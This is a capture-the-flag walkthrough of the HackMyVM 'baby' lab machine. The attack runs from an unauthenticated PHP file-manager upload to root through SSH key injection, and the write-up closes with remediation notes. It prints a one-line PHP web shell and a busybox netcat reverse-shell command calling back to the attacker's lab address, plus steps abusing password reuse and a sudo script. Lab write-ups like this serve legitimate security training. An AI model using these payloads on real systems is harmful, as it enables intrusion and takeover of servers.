# baby

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| baby | Linux | maze_team | easy | HackMyVM |

**Summary:** An ARP sweep on the VirtualBox host-only network located the target at 192.168.56.110, where full TCP and service scans found OpenSSH 8.4p1 on port 22 and Apache 2.4.62 on port 80. Directory fuzzing only surfaced the web root and index.php, and opening the site in a browser showed an unauthenticated Simple PHP File Manager instance. Uploading a one-line PHP web shell gave me command execution as www-data, which I turned into an upgraded bash reverse shell with busybox netcat. Reading /etc/passwd revealed three local user accounts alongside a password hint pointing to root in aaa's comment field, and because every local user shared that same password, I switched directly to ccc. Checking sudo privileges on ccc showed passwordless execution of a root-owned script at /opt/ccc.sh, whose error output revealed that it copied ccc's RSA public key. Generating an SSH keypair for ccc and running the script again appended my key to root's authorized_keys, letting me SSH into localhost as root and read both flags.

---

## Reconnaissance

I started with an ARP sweep across the `vboxnet0` host-only interface to locate active guests on the local segment.

```zsh
❯ arp-scan -I vboxnet0 -l
Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.100  08:00:27:d3:90:01       PCS Systemtechnik GmbH
192.168.56.110  08:00:27:02:24:54       PCS Systemtechnik GmbH

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.507 seconds (102.11 hosts/sec). 2 responded
```

Two VirtualBox guests answered, and `192.168.56.110` was the new target. I stored it in a shell variable for the rest of the session.

```zsh
❯ ip=192.168.56.110
```

Next, I scanned all 65,535 TCP ports to find every open service before running version and default script checks against the discovered ports.

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-25 11:27 +0700
Nmap scan report for 192.168.56.110
Host is up (0.0015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
❯ nmap -p22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-25 11:28 +0700
Nmap scan report for 192.168.56.110
Host is up (0.00064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

Only OpenSSH 8.4p1 and Apache 2.4.62 on Debian were exposed, so the web service was the clear entry surface. I saved the base HTTP URL and fuzzed for hidden endpoints and PHP files with `feroxbuster`.

```zsh
❯ url=http://$ip
```

With the target URL set, I ran `feroxbuster` using the `common.txt` wordlist and `.txt`/`.php` extensions.

```zsh
❯ feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.14.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.110/
 🚩  In-Scope Url          │ 192.168.56.110
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.14.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      282l      867w    12740c http://192.168.56.110/
200      GET      282l      867w    12740c http://192.168.56.110/index.php
[####################] - 12s    14274/14274   0s      found:2       errors:0
[####################] - 12s    14256/14256   1190/s  http://192.168.56.110/
```

The scan returned only `/` and `/index.php` at 12,740 bytes, meaning the entire application sat on the landing page.

## Initial Access

### Unauthenticated File Upload via Simple PHP File Manager

Browsing to `http://192.168.56.110` opened an empty directory listing managed by `simple php filemanager by jcampbell1`, with no login gate and a direct upload widget right in the top bar. I wrote a small PHP command runner locally to test whether the application accepted and executed `.php` uploads.

```zsh
❯ echo '<?php echo "Shell";system($_GET["cmd"]); ?>' > shell.php
```

I selected `shell.php` in the browser upload control and submitted it directly into the web root.

![](<Pasted image 20261125113601.png>)

Once the upload finished, I requested `shell.php` with `cmd=id` to check whether Apache executed it.

```zsh
❯ curl -s "$url/shell.php?cmd=id"
Shelluid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The server ran the command and returned `uid=33(www-data)`, confirming arbitrary PHP execution. Next, I started a `netcat` listener on port 8888 to catch a reverse shell.

```zsh
❯ nc -lvnp 8888
Listening on 0.0.0.0 8888
```

With the listener waiting, I triggered a `busybox nc` bash reverse shell back to `192.168.56.1` through the `cmd` parameter.

```zsh
❯ curl -s "$url/shell.php?cmd=busybox%20nc%20192.168.56.1%208888%20-e%20%2Fbin%2Fbash"
```

The connection landed immediately from `192.168.56.110`, so I checked for `script` and `python3` and upgraded the raw socket into an interactive PTY.

```zsh
Connection received on 192.168.56.110 33328
which script python3
/usr/bin/script
/usr/bin/python3
script -qc /bin/bash /dev/null
www-data@Baby:/var/www/html$ ^Z
[1]  + 431389 suspended  nc -lvnp 8888
❯ stty raw -echo ; fg
[1]  + 431389 continued  nc -lvnp 8888

www-data@Baby:/var/www/html$ export TERM=xterm
www-data@Baby:/var/www/html$ export SHELL=/bin/bash
www-data@Baby:/var/www/html$ stty cols 120 rows 150
```

That gave me a clean bash prompt as `www-data` inside `/var/www/html`.

## Lateral Movement

### Password Reuse via /etc/passwd GECOS Hint

To map out local users with login shells, I filtered `/etc/passwd` for entries ending in `sh`. The output listed `welcome`, `aaa`, `bbb`, and `ccc`, and `aaa`'s comment field contained `pa**wd -> root`, so I switched to `aaa` with `root` as the password and checked `sudo -l`.

```zsh
www-data@Baby:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
aaa:x:1001:1001:pa**wd -> root:/home/aaa:/bin/bash
bbb:x:1002:1002:,,,:/home/bbb:/bin/bash
ccc:x:1003:1003:,,,:/home/ccc:/bin/bash
www-data@Baby:/var/www/html$ su - aaa
Password:
aaa@Baby:~$ id
uid=1001(aaa) gid=1001(aaa) groups=1001(aaa)
aaa@Baby:~$ sudo -l
Matching Defaults entries for aaa on Baby:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User aaa may run the following commands on Baby:
    (ALL) NOPASSWD: /usr/bin/wc
```

`aaa` could run `/usr/bin/wc` without a password, though I did not need it yet because I also wanted to check `/opt` for custom files.

```zsh
aaa@Baby:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Oct 12  2025 .
drwxr-xr-x 18 root root 4096 Mar 18  2025 ..
-rwx------  1 root root   69 Oct 12  2025 ccc.sh
```

Inside `/opt` sat a 69-byte script named `ccc.sh` owned by `root` with `0700` permissions, so I could not read it directly. Given the filename and the fact that every local account turned out to share the same `root` password, I checked the `sudo` rights of `bbb` and `ccc` as well.

```zsh
ccc@Baby:~$ su - bbb
Password:
bbb@Baby:~$ sudo -l
Matching Defaults entries for bbb on Baby:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bbb may run the following commands on Baby:
    (ALL) NOPASSWD: /usr/bin/ls
```

`bbb` only had passwordless `ls`, so I moved to `ccc` using the same password and ran `sudo -l` there.

```zsh
aaa@Baby:~$ su - ccc
Password:
ccc@Baby:~$ sudo -l
Matching Defaults entries for ccc on Baby:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ccc may run the following commands on Baby:
    (ALL) NOPASSWD: /opt/ccc.sh
```

That explained the script name: `ccc` could run `/opt/ccc.sh` as `root` with `NOPASSWD`.

## Privilege Escalation

### Root SSH Key Injection via /opt/ccc.sh

Even though `/opt/ccc.sh` was unreadable (`0700`), running it through `sudo` could reveal what it expected or wrote. I executed it as `ccc` and also checked whether `/home/ccc/.ssh/` existed.

```zsh
ccc@Baby:~$ sudo -u root /opt/ccc.sh
cp: cannot stat '/home/ccc/.ssh/id_rsa.pub': No such file or directory
ccc@Baby:~$ ls -la /home/ccc/.ssh/
ls: cannot access '/home/ccc/.ssh/': No such file or directory
```

The `cp` error gave away the script's exact source path: it tried to read `/home/ccc/.ssh/id_rsa.pub`, which did not exist yet. Assuming the script copied that public key somewhere privileged, I created `/home/ccc/.ssh/`, generated a passwordless RSA keypair in that exact path, and ran `/opt/ccc.sh` again via `sudo`.

```zsh
ccc@Baby:~$ mkdir -p ~/.ssh/
ccc@Baby:~$ ssh-keygen -t rsa -f /home/ccc/.ssh/id_rsa -N ""
Generating public/private rsa key pair.
Your identification has been saved in /home/ccc/.ssh/id_rsa
Your public key has been saved in /home/ccc/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:l0/hBPeVyxAuU2I4J+6ERMpZO3mQ7ETHIarpuNFnSu0 ccc@Baby
The key's randomart image is:
+---[RSA 3072]----+
|      +*oo+o.o. o|
|    . ==*=.++o o |
|     =++o.+oo.+ .|
|    o  ooo +o. o |
|   o    S o o    |
|  + .    o o     |
| o + +      .    |
|  + =            |
| . . E           |
+----[SHA256]-----+
ccc@Baby:~$ sudo -u root /opt/ccc.sh
```

This time the script completed without an error. I tested SSH authentication to `root@localhost` to see whether my generated key had landed in root's `authorized_keys`, then verified my identity and read `/opt/ccc.sh`.

```zsh
ccc@Baby:~$ ssh root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux Baby 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 12 03:42:24 2025 from 192.168.3.94
root@Baby:~# id;hostname
uid=0(root) gid=0(root) groups=0(root)
Baby
root@Baby:~# cat /opt/ccc.sh
#!/bin/bash

cp /home/ccc/.ssh/id_rsa.pub /root/.ssh/authorized_keys
```

Key-based SSH dropped me straight into a root shell, and `/opt/ccc.sh` confirmed the single `cp` line overwriting `/root/.ssh/authorized_keys` from `/home/ccc/.ssh/id_rsa.pub`. From there, I pulled both flags.

```zsh
root@Baby:~# cat /home/*/user.txt /root/root.txt
flag{user-b86...
flag{root-7ed...
```

## Attack Chain Summary

Initial access came through `simple php filemanager by jcampbell1` on port 80, where I uploaded `shell.php` directly to the web root and executed commands as `www-data`. That foothold rested on a design weakness: an administrative file manager exposed without authentication that saved and executed arbitrary `.php` uploads in the web directory, so the fix is placing the interface behind authentication and blocking `.php` execution or upload extensions in the upload path. From `www-data`, reading `/etc/passwd` gave me `aaa`'s password (`root`) inside the GECOS field, and password reuse across `aaa`, `bbb`, and `ccc` let me switch into `ccc`. That lateral move stemmed from a misconfiguration in storing a plaintext password hint in `/etc/passwd` paired with an authentication design weakness of reusing one weak password across local users, which closes by removing credential data from `/etc/passwd` and enforcing unique, strong passwords per account. Finally, `ccc` held passwordless `sudo` access to `/opt/ccc.sh`, whose `cp` command copied `/home/ccc/.ssh/id_rsa.pub` to `/root/.ssh/authorized_keys` and gave me root SSH access on localhost. That escalation combined a `sudoers` misconfiguration with a code flaw in `/opt/ccc.sh` trusting a user-writable key path to overwrite root's `authorized_keys`, so the fix is removing the `NOPASSWD` rule for `/opt/ccc.sh` and never copying user-controlled SSH keys into `/root/.ssh/`.
